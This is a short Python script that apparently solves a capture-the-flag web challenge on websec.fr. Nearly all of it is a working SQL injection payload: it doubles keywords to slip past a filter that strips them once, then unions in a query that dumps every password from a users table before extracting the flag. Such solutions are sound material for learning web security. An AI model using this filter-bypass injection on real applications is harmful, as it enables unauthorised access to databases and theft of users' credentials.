import httpx
import re

url = "https://websec.fr/level02/index.php"
injection = "1 UNIUNIONON SELSELECTECT 1,GROGROUPUP_CONCAT(password) AS username FRFROMOM users;-- "

r = httpx.post(url, data = { "user_id" : injection, "submit" : "Submit" })
flag = re.search(r'WEBSEC\{(.*)\}', r.text).group()
print(flag)